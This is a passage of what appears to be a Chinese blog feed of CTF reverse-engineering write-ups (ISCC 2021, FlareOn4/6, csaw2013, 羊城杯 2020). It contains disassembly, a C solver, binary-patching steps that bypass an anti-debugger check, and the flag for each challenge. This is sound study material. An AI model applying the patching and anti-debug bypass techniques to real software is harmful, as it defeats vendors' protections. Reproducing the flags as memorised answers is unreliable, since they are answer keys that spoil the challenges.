class="keyword">new</span> String();</span><br><span class="line">      <span class="keyword">this</span>(arrayOfByte2);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">      exception.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="third"><a href="#third" class="headerlink" title="third"></a>third</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.mobileeasy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">third</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">thirdStr</span><span class="params">(String paramString)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (paramString.length() != <span class="number">8</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">    <span class="keyword">char</span> c1 = paramString.charAt(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> c2 = paramString.charAt(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">char</span> c3 = paramString.charAt(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">char</span> c4 = paramString.charAt(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">char</span> c5 = paramString.charAt(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">char</span> c6 = paramString.charAt(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">char</span> c7 = paramString.charAt(<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">char</span> c8 = paramString.charAt(<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">return</span> (c1 % <span class="number">8</span> != <span class="number">7</span> || c1 % <span class="number">9</span> != <span class="number">8</span>) ? <span class="keyword">false</span> : ((c2 - <span class="number">3</span> != <span class="number">100</span>) ? <span class="keyword">false</span> : (((c3 ^ <span class="number">0x5D</span>) != <span class="number">100</span>) ? <span class="keyword">false</span> : ((c3 * <span class="number">2</span> - <span class="number">10</span> != c4) ? <span class="keyword">false</span> : ((c5 + <span class="number">1</span> != <span class="number">120</span>) ? <span class="keyword">false</span> : (((c6 ^ c7) != <span class="number">56</span>) ? <span class="keyword">false</span> : ((c6 - c7 != <span class="number">24</span> || c7 - c8 != <span class="number">4</span>) ? <span class="keyword">false</span> : (!(c8 != <span class="string">&#x27;P&#x27;</span>))))))));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这一题写脚本还没手算快,AES在线解密即可.</p><blockquote><p>ISCC{m0B1lE_1s_Gg9reaT!}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
          <category> ISCC-2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录4</title>
      <link href="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/"/>
      <url>/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/</url>
      
        <content type="html"><![CDATA[<h1 id="FlareOn4-IgniteMe"><a href="#FlareOn4-IgniteMe" class="headerlink" title="[FlareOn4]IgniteMe"></a>[FlareOn4]IgniteMe</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#[FlareOn4]IgniteMe">题目链接</a><br>查看文件信息，32位，无壳。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/1.PNG"></p><blockquote><p>进入start函数</p></blockquote><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/2.PNG"></p><h2 id="进入sub-4010F0"><a href="#进入sub-4010F0" class="headerlink" title="进入sub_4010F0"></a>进入sub_4010F0</h2><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/3.PNG"></p><p>去掉字符串中的‘\n’和‘\r’，不过最后好像没有用到。</p><h2 id="进入sub-401050"><a href="#进入sub-401050" class="headerlink" title="进入sub_401050"></a>进入sub_401050</h2><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/4.PNG"></p><p>其中v4可以通过看汇编代码得出，也可以通过动态调试得出。<br>sub_401020是读取长度，byte_403078是我们输入的flag。</p><blockquote><p>汇编代码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 sub_401000      proc near               ; CODE XREF: sub_401050+16↓p</span><br><span class="line">.text:00401000                 push    ebp</span><br><span class="line">.text:00401001                 mov     ebp, esp</span><br><span class="line">.text:00401003                 mov     eax, 80070057h</span><br><span class="line">.text:00401008                 mov     edx, eax</span><br><span class="line">.text:0040100A                 xor     ax, dx</span><br><span class="line">.text:0040100D                 rol     eax, 4</span><br><span class="line">.text:00401010                 shr     ax, 1</span><br><span class="line">.text:00401013                 pop     ebp</span><br><span class="line">.text:00401014                 retn</span><br><span class="line">.text:00401014 sub_401000      endp</span><br><span class="line">&#x2F;&#x2F;sub_401000的汇编代码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:00401050 sub_401050      proc near               ; CODE XREF: start+44↓p</span><br><span class="line">.text:00401050</span><br><span class="line">.text:00401050 var_C           &#x3D; dword ptr -0Ch</span><br><span class="line">.text:00401050 var_8           &#x3D; dword ptr -8</span><br><span class="line">.text:00401050 var_1           &#x3D; byte ptr -1</span><br><span class="line">.text:00401050</span><br><span class="line">.text:00401050                 push    ebp</span><br><span class="line">.text:00401051                 mov     ebp, esp</span><br><span class="line">.text:00401053                 sub     esp, 0Ch</span><br><span class="line">.text:00401056                 push    offset byte_403078</span><br><span class="line">.text:0040105B                 call    sub_401020</span><br><span class="line">.text:00401060                 add     esp, 4</span><br><span class="line">.text:00401063                 mov     [ebp+var_C], eax</span><br><span class="line">.text:00401066                 call    sub_401000</span><br><span class="line">.text:0040106B                 mov     [ebp+var_1], al</span><br><span class="line">.text:0040106E                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:00401071                 sub     eax, 1</span><br><span class="line">.text:00401074                 mov     [ebp+var_8], eax</span><br><span class="line">.text:00401077                 jmp     short loc_401082</span><br><span class="line">.text:00401079 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401079</span><br><span class="line">.text:00401079 loc_401079:                             ; CODE XREF: sub_401050+5D↓j</span><br><span class="line">.text:00401079                 mov     ecx, [ebp+var_8]</span><br><span class="line">.text:0040107C                 sub     ecx, 1</span><br><span class="line">.text:0040107F                 mov     [ebp+var_8], ecx</span><br><span class="line">.text:00401082</span><br><span class="line">.text:00401082 loc_401082:                             ; CODE XREF: sub_401050+27↑j</span><br><span class="line">.text:00401082                 cmp     [ebp+var_8], 0</span><br><span class="line">.text:00401086                 jl      short loc_4010AF</span><br><span class="line">.text:00401088                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:0040108B                 movsx   eax, byte_403078[edx]</span><br><span class="line">.text:00401092                 movzx   ecx, [ebp+var_1]</span><br><span class="line">.text:00401096                 xor     eax, ecx</span><br><span class="line">.text:00401098                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:0040109B                 mov     byte_403180[edx], al</span><br><span class="line">.text:004010A1                 mov     eax, [ebp+var_8]</span><br><span class="line">.text:004010A4                 mov     cl, byte_403078[eax]</span><br><span class="line">.text:004010AA                 mov     [ebp+var_1], cl</span><br><span class="line">.text:004010AD                 jmp     short loc_401079</span><br><span class="line">&#x2F;&#x2F;sub_401050的部分汇编代码（第一个for循环结束）</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> length(x) sizeof(x) / sizeof(x[0])</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag[]=&#123;<span class="number">13</span>,  <span class="number">38</span>,  <span class="number">73</span>,  <span class="number">69</span>,  <span class="number">42</span>,  <span class="number">23</span>, <span class="number">120</span>,  <span class="number">68</span>,  <span class="number">43</span>, <span class="number">108</span>, <span class="number">93</span>,  <span class="number">94</span>,  <span class="number">69</span>,  <span class="number">18</span>,  <span class="number">47</span>,  <span class="number">23</span>,  <span class="number">43</span>,  <span class="number">68</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">86</span>,   <span class="number">9</span>,  <span class="number">95</span>,  <span class="number">69</span>,  <span class="number">71</span>, <span class="number">115</span>,  <span class="number">38</span>,  <span class="number">10</span>,  <span class="number">13</span>,  <span class="number">19</span>, <span class="number">23</span>,  <span class="number">72</span>,  <span class="number">66</span>,   <span class="number">1</span>,  <span class="number">64</span>,  <span class="number">77</span>,  <span class="number">12</span>,   <span class="number">2</span>, <span class="number">105</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> v4=<span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=length(flag)<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] ^=v4;</span><br><span class="line">v4=flag[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;length(flag);i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>flag{R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com}</p></blockquote><h1 id="o-strings-attached"><a href="#o-strings-attached" class="headerlink" title="o-strings-attached"></a>o-strings-attached</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5080&page=1">题目链接</a><br>查看文件信息，32位，无壳。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/5.PNG"></p><p>在加密函数最后添加断点，直接得到flag。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/6.PNG"></p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/7.PNG"></p><blockquote><p>9447{you_are_an_international_mystery}</p></blockquote><h1 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h1><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5081&page=1">题目链接</a><br>查看文件信息，32位，无壳。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/8.PNG"></p><p>拖入ida中查看程序逻辑</p><h3 id="伪代码窗口"><a href="#伪代码窗口" class="headerlink" title="伪代码窗口"></a>伪代码窗口</h3><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/9.PNG"></p><p>进一步分析可知：</p><ol><li>sub_40102A的返回值为0</li><li>IsDebuggerPresent函数：<br> 如果当前进程运行在调试器的上下文，返回值为非零值。<br> 如果当前进程没有运行在调试器的上下文，返回值是零。</li></ol><p>lpMem是输出的flag，12-15行是输出的那个窗口，sub_401000是对lpMem进行加密的函数。<br>直接运行程序并不会对对lpMem进行加密，需要对程序进行修改.</p><h3 id="反汇编窗口"><a href="#反汇编窗口" class="headerlink" title="反汇编窗口"></a>反汇编窗口</h3><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/10.PNG"></p><ol><li>将 jnz     short loc_401096 改为 jmp     short loc_401096</li><li>将 int     3 nop</li><li>将 jmp     short loc_4010EF 改为 jmp     short loc_4010B9</li></ol><blockquote><p>patch后的程序</p></blockquote><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/11.PNG"></p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/12.PNG"></p><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/13.PNG"></p><h2 id="od"><a href="#od" class="headerlink" title="od"></a>od</h2><p>和ida思路相同</p><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><blockquote><p>将 jnz     short loc_401096 改为 jmp     short loc_401096</p></blockquote><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/14.PNG"></p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><blockquote><p>将 int     3 nop</p></blockquote><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/15.PNG"></p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><blockquote><p>将 jmp     short loc_4010EF 改为 jmp     short loc_4010B9</p></blockquote><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/16.PNG"></p><h3 id="运行程序-1"><a href="#运行程序-1" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/17.PNG"></p><blockquote><p>flag{reversing_is_not_that_hard!}</p></blockquote><h1 id="FlareOn6-Overlong"><a href="#FlareOn6-Overlong" class="headerlink" title="[FlareOn6]Overlong"></a>[FlareOn6]Overlong</h1><p><a href="https://buuoj.cn/challenges#[FlareOn6]Overlong">题目链接</a><br>查看文件信息，32位，无壳。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/19.PNG"></p><p>进入main函数</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/20.PNG"></p><p>第6行是对unk_402008进行一系列运算，变成Text，但unk_402008的长度为0xAF，这个函数只处理了28位，再结合题目名字，我们将28改为0xAF即可。<br>这里直接patch会报错，在16进制界面修改。改好后运行程序。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/21.PNG"></p><blockquote><p>flag{I_a_M_t_h_e_e_n_C_o_D_i_n_g@flare-on.com}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录3</title>
      <link href="/2021/04/16/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/"/>
      <url>/2021/04/16/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</url>
      
        <content type="html"><![CDATA[<h1 id="羊城杯-2020-Bytecode"><a href="#羊城杯-2020-Bytecode" class="headerlink" title="[羊城杯 2020]Bytecode"></a>[羊城杯 2020]Bytecode</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]Bytecode">题目链接</a><br>这道题是python字节码，参考<a href="https://docs.python.org/zh-cn/3/library/dis.html?highlight=dis">官方文档</a>手动还原.</p><blockquote><p>字节码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br></pre></td><td class="code"><pre><span class="line">  4           0 LOAD_CONST               0 (3)</span><br><span class="line">              3 LOAD_CONST               1 (37)</span><br><span class="line">              6 LOAD_CONST               2 (72)</span><br><span class="line">              9 LOAD_CONST               3 (9)</span><br><span class="line">             12 LOAD_CONST               4 (6)</span><br><span class="line">             15 LOAD_CONST               5 (132)</span><br><span class="line">             18 BUILD_LIST               6</span><br><span class="line">             21 STORE_NAME               0 (en)</span><br><span class="line">en&#x3D;[3,37,72,9,6,132]</span><br><span class="line"></span><br><span class="line">  5          24 LOAD_CONST               6 (101)</span><br><span class="line">             27 LOAD_CONST               7 (96)</span><br><span class="line">             30 LOAD_CONST               8 (23)</span><br><span class="line">             33 LOAD_CONST               9 (68)</span><br><span class="line">             36 LOAD_CONST              10 (112)</span><br><span class="line">             39 LOAD_CONST              11 (42)</span><br><span class="line">             42 LOAD_CONST              12 (107)</span><br><span class="line">             45 LOAD_CONST              13 (62)</span><br><span class="line">             48 LOAD_CONST               7 (96)</span><br><span class="line">             51 LOAD_CONST              14 (53)</span><br><span class="line">             54 LOAD_CONST              15 (176)</span><br><span class="line">             57 LOAD_CONST              16 (179)</span><br><span class="line">             60 LOAD_CONST              17 (98)</span><br><span class="line">             63 LOAD_CONST              14 (53)</span><br><span class="line">             66 LOAD_CONST              18 (67)</span><br><span class="line">             69 LOAD_CONST              19 (29)</span><br><span class="line">             72 LOAD_CONST              20 (41)</span><br><span class="line">             75 LOAD_CONST              21 (120)</span><br><span class="line">             78 LOAD_CONST              22 (60)</span><br><span class="line">             81 LOAD_CONST              23 (106)</span><br><span class="line">             84 LOAD_CONST              24 (51)</span><br><span class="line">             87 LOAD_CONST               6 (101)</span><br><span class="line">             90 LOAD_CONST              25 (178)</span><br><span class="line">             93 LOAD_CONST              26 (189)</span><br><span class="line">             96 LOAD_CONST               6 (101)</span><br><span class="line">             99 LOAD_CONST              27 (48)</span><br><span class="line">            102 BUILD_LIST              26</span><br><span class="line">            105 STORE_NAME               1 (output)</span><br><span class="line">output&#x3D;[101, 96, 23, 68, 112, 42, 107, 62, 96, 53, 176, 179, 98, 53, 67, 29, 41, 120, 60, 106, 51, 101, 178, 189, 101, 48]</span><br><span class="line"></span><br><span class="line">  7         108 LOAD_CONST              28 (&#39;welcome to GWHT2020&#39;)</span><br><span class="line">            111 PRINT_ITEM          </span><br><span class="line">            112 PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line">  9         113 LOAD_NAME                2 (raw_input)</span><br><span class="line">            116 LOAD_CONST              29 (&#39;please input your flag:&#39;)</span><br><span class="line">            119 CALL_FUNCTION            1</span><br><span class="line">            122 STORE_NAME               3 (flag)</span><br><span class="line">input(flag)</span><br><span class="line"></span><br><span class="line"> 10         125 LOAD_NAME                3 (flag)</span><br><span class="line">            128 STORE_NAME               4 (str)</span><br><span class="line">str&#x3D;flag</span><br><span class="line"></span><br><span class="line"> 12         131 LOAD_NAME                5 (len)</span><br><span class="line">            134 LOAD_NAME                4 (str)</span><br><span class="line">            137 CALL_FUNCTION            1</span><br><span class="line">            140 STORE_NAME               6 (a)</span><br><span class="line">a&#x3D;len(str)</span><br><span class="line"></span><br><span class="line"> 13         143 LOAD_NAME                6 (a)</span><br><span class="line">            146 LOAD_CONST              30 